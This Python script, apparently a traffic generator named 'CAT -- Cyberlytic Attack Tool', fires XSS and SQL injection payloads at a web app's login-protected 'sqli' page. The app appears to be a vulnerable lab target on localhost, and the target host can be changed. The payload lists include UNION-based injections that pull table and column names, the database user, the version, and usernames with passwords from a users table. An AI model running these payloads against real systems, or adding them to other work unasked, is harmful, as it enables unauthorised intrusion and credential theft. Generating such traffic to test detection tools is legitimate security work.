#!/usr/bin/env python
import random
import requests
from random import randint
import time
import sys
import os


DEFAULT_HOST = 'localhost:8080'

attacks = {
    'low': [
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">",
        "onmouseover=alert(1);",
        "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;\">",
        "<OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT>",
        "<object classid=\"clsid:...\" codebase=\"javascript:alert(1);\">",
        "<object id=\"x\" classid=\"clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598\"></object> <object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" onqt_error=\"javascript:alert(1)\" style=\"behavior:url(#x);\"><param name=postdomevents /></object>",
        "<object type=image src=kcf.gif onreadystatechange=alert(1)></object>",
        "<STYLE TYPE=\"text/javascript\">javascript:alert(1);</STYLE>",
        "<a&#32;href&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ</a",
        "1 AND 1184=9752",
        "'or'5'='5--",
    ],
    'medium': [
               "<script>x='<script><img src=xx:xx onerror=alert(1)>';</script>",
               "$' or 0=0#",
               "1' or '1' = '1",
               "id=' order by 3 #",
               "%' or 0=0#",
    ],
    'high': [
        "%' and 1=0 union select null, table_name from information_schema.tables #",
        "%' or 0=0 union select null, database() #",
        "%' or 0=0 union select null, user() #",
        "%' or 0=0 union select null, version() #",
        "%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #",
    ],
    'critical': [
        "%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #"
    ],
}

help_text = """
CAT -- Cyberlytic Attack Tool

Usage: ./generate-traffic.py mode [targethost]

The following modes of operation are available:

    low       - Run "low" risk attacks against a website
    medium    - Run "medium" risk attacks against a website
    high      - Run "high" risk attacks against a website
    critical  - Run "critical" risk attacks against a website
    random    - Run random traffic
    browsing  - Simulate casual browsing

Optionally, you can specify the target website as the third parameter.

By default, the attacks are run against the following domain:

    * {}

Example usage:

    ./generate-traffic.py random

!!! DISCLAIMER: Usage of this tool for attacking targets without prior mutual
consent is illegal. It is the end user's responsibility to obey all
applicable laws. Cyberlytic assumes no liability and are not responsible for
any misuse or damage caused by this program.
        """


def run_attacks():
    if not len(sys.argv) >= 2 \
       or sys.argv[0] == '-h' \
       or sys.argv[0] == '--help':
        help_and_exit()

    frequency = 10
    mode = sys.argv[1]

    if len(sys.argv) >= 3:
        host = sys.argv[2]
    else:
        host = os.getenv('TARGET_HOST', DEFAULT_HOST)

    print(">> Generating {} pieces of {} traffic for {}".format(frequency, mode, host))
    print(">>> Logging in like a good citizen")
    sys.stdout.flush()

    initialise = populateBhratach('http://{}'.format(host))

    if mode in attacks:
        attackSet = attacks[mode]
        for num in range(frequency):
            print(">>> {}".format(num))
            initialise.generate_malicious(random.sample(attackSet, 1)[0])
            time.sleep(1)

        return

    elif mode == 'random':
        for num in range(frequency):
            print(">>> {}".format(num))
            attackSet = attacks[random.sample(attacks.keys(), 1)[0]]
            initialise.generate_malicious(random.sample(attackSet, 1)[0])
            time.sleep(1)

        return

    elif mode == 'browsing':
        for num in range(frequency):
            print(">>> {}".format(num))
            initialise.generate_normal()
            time.sleep(1)

        return

    else:
        help_and_exit()


def help_and_exit():
    print(help_text.format(*DEFAULT_HOST))
    sys.exit(0)


class populateBhratach():
    def __init__(self, base_url):
        self.URL = base_url
        self.login = self.URL + '/bhratach/login.php'
        with requests.Session() as self.session:
            self.session.post(self.login, data={'username': 'user',
                                                'password': 'pass',
                                                'Login': 'Login'})
        self.pages = [{'page': '/bhratach/'},
                      {'page': '/bhratach/flag/msg/'},
                      {'page': '/bhratach/flag/extranet/',
                       'params': {'username': 'testUser',
                                  'password': 'testPass',
                                  'Login': 'Login'}},
                      {'page': '/bhratach/flag/extranet/sqli/',
                       'params': {'id': '1', 'Submit': 'Submit'}},
                      {'page': '/bhratach/flag/name/',
                       'params': {'name': 'testName'}}]

    def generate_normal(self):
        page = random.sample(self.pages, 1)[0]

        self.totalURL = self.URL + page['page']
        self.parameters = page.get('params', {})
        if 'id' in self.parameters:
            self.parameters['id'] = randint(1, 5)

        self.session.get(self.totalURL, params=self.parameters)

    def generate_malicious(self, attack):
        page = self.pages[3]

        self.totalURL = self.URL + page['page']
        self.parameters = page['params']
        self.parameters['id'] = attack
        self.session.get(self.totalURL, params=self.parameters)


if __name__ == '__main__':
    run_attacks()
